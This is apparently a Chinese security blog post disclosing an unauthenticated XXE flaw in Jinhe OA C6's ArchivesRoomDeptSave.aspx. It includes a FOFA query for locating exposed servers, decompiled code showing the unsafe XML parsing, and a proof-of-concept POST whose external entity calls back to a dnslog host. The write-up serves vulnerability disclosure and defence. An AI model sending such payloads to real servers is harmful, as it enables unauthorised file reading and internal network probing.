---
title: "金和OA ArchivesRoomDeptSave.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ArchivesRoomDeptSave-xxe.html
asset_dir: assets/金和oa-archivesroomdeptsave.aspx-xxe漏洞
---

# 金和OA ArchivesRoomDeptSave.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/13 13:32
- 1943浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

网络安全课程

安全工具开发

计算机安全

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ArchivesRoomDeptSave.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ArchivesRoomDeptSave.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **ArchivesRoomDeptSave** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  if (this.IsPostBack)
    return;
  XmlDataDocument xmlDataDocument = new XmlDataDocument();
  ((XmlDocument) xmlDataDocument).Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

深入探索

代码安全审计

SQL注入防护

传输层安全性协议

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Archives/ArchivesRoomDeptSave.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ArchivesRoomDeptSave.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
